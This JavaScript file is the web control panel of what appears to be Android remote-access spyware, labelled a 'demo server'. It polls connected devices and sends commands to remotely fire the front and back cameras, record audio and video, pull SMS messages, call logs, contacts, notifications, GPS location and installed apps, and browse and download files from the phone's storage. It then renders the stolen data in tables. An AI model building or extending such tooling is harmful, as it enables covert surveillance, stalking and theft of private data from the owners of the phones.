// Android Device Demo Server - Web GUI v5.2

let pollingInterval = null;
let currentReceivedDir = '';
let selectedGalleryItem = null;
let selectedFileItem = null;
const POLL_INTERVAL = 3000;

document.addEventListener('DOMContentLoaded', () => {
    setupTabs();
    setupDashboardControls();
    setupGalleryControls();
    setupFileBrowserControls();
    setupReceivedFilesControls();
    setupDataViewerControls();
    startPolling();
});

// === TAB SWITCHING ===
function setupTabs() {
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            btn.classList.add('active');
            document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
        });
    });
}

// === POLLING ===
function startPolling() {
    if (pollingInterval) clearInterval(pollingInterval);
    pollingInterval = setInterval(fetchDashboardData, POLL_INTERVAL);
    fetchDashboardData();
}

function fetchDashboardData() {
    Promise.all([
        fetch('/api/devices').then(r => r.json()).catch(() => []),
        fetch('/api/logs').then(r => r.json()).catch(() => ({ logs: [] })),
        fetch('/api/stats').then(r => r.json()).catch(() => ({}))
    ])
    .then(([devices, logsData, stats]) => {
        updateDevices(devices);
        updateLogs(logsData);
        updateStats(stats);
    })
    .catch(() => {});
}

// === DASHBOARD ===
function updateDevices(devices) {
    const el = document.getElementById('devices-list');
    if (!devices || devices.length === 0) { el.innerHTML = '<p>No devices connected</p>'; return; }
    el.innerHTML = devices.map(d => `
        <div class="device-card ${d.status === 'ONLINE' ? 'online' : 'offline'}">
            <div class="dev-header">
                <strong>#${d.id}</strong>
                <span class="dev-status" style="color:${d.status === 'ONLINE' ? '#3fb950' : '#f85149'}">${d.status}</span>
            </div>
            <div class="dev-info">
                IP: ${d.ip}<br>
                Model: ${d.model}<br>
                Img: ${d.images} | Vid: ${d.videos} | Notif: ${d.notifications}
            </div>
        </div>`).join('');
}

function updateLogs(data) {
    const el = document.getElementById('logs');
    if (!el) return;
    const logs = data.logs || [];
    if (!logs.length) { el.innerHTML = '<p>Waiting for logs...</p>'; return; }
    el.innerHTML = logs.map(line => `<div class="log-entry">${line}</div>`).join('');
    const container = document.getElementById('logs-container');
    if (container) container.scrollTop = container.scrollHeight;
}

function updateStats(stats) {
    const el = document.getElementById('stats');
    if (!el || !stats) return;
    const uptime = stats.uptime ? Math.round(stats.uptime) + 's' : '0s';
    el.innerHTML = `
        <div class="stat-item"><div class="stat-label">Uptime</div><div class="stat-value">${uptime}</div></div>
        <div class="stat-item"><div class="stat-label">Connections</div><div class="stat-value">${stats.total_connections || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Active</div><div class="stat-value">${stats.active_connections || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Images</div><div class="stat-value">${stats.total_images || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Audio</div><div class="stat-value">${stats.total_audio || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Videos</div><div class="stat-value">${stats.total_videos || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Commands</div><div class="stat-value">${stats.total_commands || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Notifications</div><div class="stat-value">${stats.total_notifications || 0}</div></div>`;
}

function sendCommand(command, args) {
    return fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command, args: args || '{}' })
    }).then(r => r.json());
}

function setupDashboardControls() {
    const btns = [
        ['btn-device-info', 'get_device_info'], ['btn-location', 'get_location'],
        ['btn-storage', 'get_storage_info'], ['btn-app-list', 'get_app_list'],
        ['btn-gallery', 'get_gallery_list'], ['btn-sms', 'get_sms_logs'],
        ['btn-call-logs', 'get_call_logs'], ['btn-contacts', 'get_contacts'],
        ['btn-notifications', 'get_notifications'], ['btn-camera-front', 'capture_front'],
        ['btn-camera-back', 'capture_back'], ['btn-record-audio', 'record_audio'],
        ['btn-record-video', 'record_video'], ['btn-download-gallery', 'download_gallery']
    ];
    btns.forEach(([id, cmd]) => {
        const el = document.getElementById(id);
        if (el) el.addEventListener('click', () => {
            sendCommand(cmd).then(() => setTimeout(fetchDashboardData, 1500));
        });
    });

    const sendBtn = document.getElementById('btn-send-custom');
    if (sendBtn) sendBtn.addEventListener('click', () => {
        const cmd = document.getElementById('cmd-input').value.trim();
        const args = document.getElementById('args-input').value.trim() || '{}';
        if (!cmd) return;
        sendCommand(cmd, args).then(() => {
            document.getElementById('cmd-input').value = '';
            document.getElementById('args-input').value = '';
            setTimeout(fetchDashboardData, 1500);
        });
    });

    const cmdInput = document.getElementById('cmd-input');
    if (cmdInput) cmdInput.addEventListener('keypress', e => { if (e.key === 'Enter') document.getElementById('btn-send-custom').click(); });
}

// === GALLERY TAB ===
function setupGalleryControls() {
    document.getElementById('btn-refresh-gallery')?.addEventListener('click', loadGallery);
    document.getElementById('btn-download-gallery-item')?.addEventListener('click', () => {
        if (!selectedGalleryItem) { alert('Select a gallery item first'); return; }
        sendCommand('download_gallery_item', JSON.stringify({ item_id: selectedGalleryItem.id }))
            .then(() => { document.getElementById('gallery-status').textContent = 'Download request sent'; });
    });
    document.getElementById('btn-download-all-gallery')?.addEventListener('click', () => {
        sendCommand('download_gallery').then(() => {
            document.getElementById('gallery-status').textContent = 'Download all request sent';
        });
    });
}

function loadGallery() {
    fetch('/api/gallery?session=1').then(r => r.json()).then(data => {
        const grid = document.getElementById('gallery-grid');
        const items = data.gallery || [];
        if (!items.length) { grid.innerHTML = '<p>No gallery data. Click "Gallery List" on dashboard first.</p>'; return; }
        grid.innerHTML = items.map(item => {
            const isImg = item.type && item.type.startsWith && item.type.startsWith('image/');
            const icon = isImg ? '🖼️' : (item.type && item.type.startsWith('video/') ? '🎬' : '📄');
            return `<div class="gallery-item" data-id="${item.id}" data-name="${item.name || ''}" data-type="${item.type || ''}">
                <div class="gi-icon">${icon}</div>
                <div class="gi-name">${item.name || 'Unknown'}</div>
                <div class="gi-size">${formatSize(item.size || 0)}</div>
            </div>`;
        }).join('');

        // Click to select
        grid.querySelectorAll('.gallery-item').forEach(el => {
            el.addEventListener('click', () => {
                grid.querySelectorAll('.gallery-item').forEach(x => x.classList.remove('selected'));
                el.classList.add('selected');
                selectedGalleryItem = { id: el.dataset.id, name: el.dataset.name, type: el.dataset.type };
            });
        });
    });
}

// === FILE BROWSER TAB ===
function setupFileBrowserControls() {
    document.getElementById('btn-browse-path')?.addEventListener('click', () => {
        const path = document.getElementById('filepath-input').value.trim() || '/sdcard';
        browseFiles(path);
    });
    document.getElementById('btn-download-file')?.addEventListener('click', () => {
        if (!selectedFileItem) { alert('Select a file first'); return; }
        sendCommand('download_file', JSON.stringify({ path: selectedFileItem.path }))
            .then(() => { document.getElementById('filebrowser-status').textContent = 'Download request sent'; });
    });
}

function browseFiles(path) {
    sendCommand('list_files', JSON.stringify({ path })).then(() => {
        document.getElementById('filebrowser-status').textContent = 'Request sent to device. Waiting for response...';
        setTimeout(() => {
            fetch('/api/filebrowser?session=1').then(r => r.json()).then(data => {
                const container = document.getElementById('filebrowser-list');
                const files = data.files || [];
                if (!files.length) { container.innerHTML = '<p>No files returned. Make sure the device is connected and has granted storage permission.</p>'; return; }
                // Parse if it's from file_list message
                let items = files;
                if (data.files.files) items = data.files.files; // file_list message has nested files array
                if (Array.isArray(data.files) && data.files.length && data.files[0].files) items = data.files;
                
                container.innerHTML = items.map(f => {
                    const isDir = f.is_dir || f.isDir || false;
                    return `<div class="fb-item" data-path="${f.path || f.full_path || ''}" data-name="${f.name || ''}" data-isdir="${isDir}">
                        <span class="fb-icon">${isDir ? '📁' : '📄'}</span>
                        <span class="fb-name">${f.name || f.display_name || 'Unknown'}</span>
                        <span class="fb-size">${formatSize(f.size || 0)}</span>
                        <span class="fb-type">${isDir ? 'DIR' : 'FILE'}</span>
                    </div>`;
                }).join('');

                container.querySelectorAll('.fb-item').forEach(el => {
                    el.addEventListener('click', () => {
                        container.querySelectorAll('.fb-item').forEach(x => x.classList.remove('selected'));
                        el.classList.add('selected');
                        const isDir = el.dataset.isdir === 'true';
                        if (isDir) {
                            selectedFileItem = null;
                            document.getElementById('filepath-input').value = el.dataset.path;
                        } else {
                            selectedFileItem = { path: el.dataset.path };
                        }
                    });
                    el.addEventListener('dblclick', () => {
                        if (el.dataset.isdir === 'true') browseFiles(el.dataset.path);
                    });
                });
                document.getElementById('filebrowser-status').textContent = `Showing ${items.length} items`;
            });
        }, 3000);
    });
}

// === RECEIVED FILES TAB ===
function setupReceivedFilesControls() {
    document.getElementById('btn-refresh-received')?.addEventListener('click', () => loadReceivedFiles(currentReceivedDir));
    document.getElementById('btn-received-up')?.addEventListener('click', () => {
        if (!currentReceivedDir) return;
        const parts = currentReceivedDir.split('/');
        parts.pop();
        loadReceivedFiles(parts.join('/'));
    });
    loadReceivedFiles('');
}

function loadReceivedFiles(subdir) {
    currentReceivedDir = subdir;
    fetch('/api/received-files?dir=' + encodeURIComponent(subdir)).then(r => r.json()).then(data => {
        const container = document.getElementById('received-list');
        document.getElementById('received-path').textContent = '/' + (subdir || '');
        const files = data.files || [];
        if (!files.length) { container.innerHTML = '<p>No files in this directory.</p>'; return; }
        container.innerHTML = files.map(f => {
            const icon = f.is_dir ? '📁' : getFileIcon(f.name);
            const link = f.is_dir ? '' : `<a class="ri-link" href="/api/download-file?path=${encodeURIComponent(f.path)}" target="_blank">View/Download</a>`;
            return `<div class="received-item" data-path="${f.path}" data-isdir="${f.is_dir}">
                <span class="ri-icon">${icon}</span>
                <span class="ri-name">${f.name}</span>
                <span class="ri-size">${formatSize(f.size)}</span>
                ${link}
            </div>`;
        }).join('');

        container.querySelectorAll('.received-item').forEach(el => {
            el.addEventListener('click', () => {
                if (el.dataset.isdir === 'true') loadReceivedFiles(el.dataset.path);
            });
        });
    });
}

function getFileIcon(name) {
    const ext = name.split('.').pop().toLowerCase();
    if (['jpg','jpeg','png','gif','webp','bmp'].includes(ext)) return '🖼️';
    if (['mp4','3gp','avi','mkv'].includes(ext)) return '🎬';
    if (['mp3','wav','ogg','3gp'].includes(ext)) return '🎵';
    if (['json','txt','log'].includes(ext)) return '📄';
    return '📄';
}

function formatSize(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

// === DATA VIEWER TAB ===
function setupDataViewerControls() {
    const btns = [
        ['btn-view-sms', 'sms_logs', renderSMS],
        ['btn-view-call', 'call_logs', renderCallLogs],
        ['btn-view-contacts', 'contacts', renderContacts],
        ['btn-view-apps', 'app_list', renderAppList],
        ['btn-view-location', 'location', renderLocation],
        ['btn-view-storage', 'storage', renderStorage],
        ['btn-view-device', 'device_info', renderDeviceInfo]
    ];
    btns.forEach(([id, type, renderer]) => {
        document.getElementById(id)?.addEventListener('click', () => {
            fetch('/api/data?session=1&type=' + type).then(r => r.json()).then(data => {
                const viewer = document.getElementById('data-viewer');
                const result = data[type] || [];
                if (!result || (Array.isArray(result) && !result.length) || (typeof result === 'object' && !Object.keys(result).length)) {
                    viewer.innerHTML = `<p class="data-empty">No ${type} data yet. Send the corresponding command from the dashboard first.</p>`;
                    return;
                }
                viewer.innerHTML = renderer(result);
            });
        });
    });
}

function renderSMS(items) {
    if (!items.length) return '<p class="data-empty">No SMS data</p>';
    const typeMap = {1:'INBOX',2:'SENT',3:'DRAFT',4:'OUTBOX'};
    return `<table><thead><tr><th>Type</th><th>From</th><th>Body</th><th>Date</th></tr></thead><tbody>` +
        items.map(s => `<tr><td>${typeMap[s.type]||'?'}</td><td>${s.from||'?'}</td><td>${(s.body||'').substring(0,80)}</td><td>${s.date||''}</td></tr>`).join('') +
        `</tbody></table>`;
}

function renderCallLogs(calls) {
    if (!calls.length) return '<p class="data-empty">No call logs</p>';
    const typeMap = {1:'IN',2:'OUT',3:'MISSED',4:'VM',5:'REJ',6:'BLK'};
    return `<table><thead><tr><th>Type</th><th>Name</th><th>Number</th><th>Duration</th><th>Date</th></tr></thead><tbody>` +
        calls.map(c => `<tr><td>${typeMap[c.type]||'?'}</td><td>${c.name||'-'}</td><td>${c.number||'?'}</td><td>${c.duration_sec||0}s</td><td>${c.date||''}</td></tr>`).join('') +
        `</tbody></table>`;
}

function renderContacts(contacts) {
    if (!contacts.length) return '<p class="data-empty">No contacts</p>';
    return `<table><thead><tr><th>Name</th><th>Phone Numbers</th></tr></thead><tbody>` +
        contacts.map(c => `<tr><td>${c.name||'Unknown'}</td><td>${(c.phones||[]).map(p => typeof p === 'string' ? p : p.number||'').join(', ')}</td></tr>`).join('') +
        `</tbody></table>`;
}

function renderAppList(apps) {
    if (!apps.length) return '<p class="data-empty">No app list</p>';
    return `<table><thead><tr><th>#</th><th>App</th></tr></thead><tbody>` +
        apps.map((a,i) => `<tr><td>${i+1}</td><td>${a}</td></tr>`).join('') +
        `</tbody></table>`;
}

function renderLocation(loc) {
    if (!loc || !Object.keys(loc).length) return '<p class="data-empty">No location data</p>';
    return `<table><tbody>` +
        `<tr><th>Latitude</th><td>${loc.latitude||'?'}</td></tr>` +
        `<tr><th>Longitude</th><td>${loc.longitude||'?'}</td></tr>` +
        `<tr><th>Accuracy</th><td>${loc.accuracy||'?'}m</td></tr>` +
        `<tr><th>Provider</th><td>${loc.provider||'?'}</td></tr>` +
        `<tr><th>Altitude</th><td>${loc.altitude||'?'}</td></tr>` +
        `<tr><th>Speed</th><td>${loc.speed||'?'}</td></tr>` +
        `</tbody></table>`;
}

function renderStorage(s) {
    if (!s || !Object.keys(s).length) return '<p class="data-empty">No storage data</p>';
    return `<table><tbody>` +
        `<tr><th>Total</th><td>${s.total_gb||'?'} GB</td></tr>` +
        `<tr><th>Free</th><td>${s.free_gb||'?'} GB</td></tr>` +
        `<tr><th>Used</th><td>${s.used_percent||'?'}%</td></tr>` +
        `</tbody></table>`;
}

function renderDeviceInfo(info) {
    if (!info || !Object.keys(info).length) return '<p class="data-empty">No device info</p>';
    const d = info.device_info || info;
    return `<table><tbody>` +
        Object.entries(d).map(([k,v]) => `<tr><th>${k}</th><td>${v}</td></tr>`).join('') +
        `</tbody></table>`;
}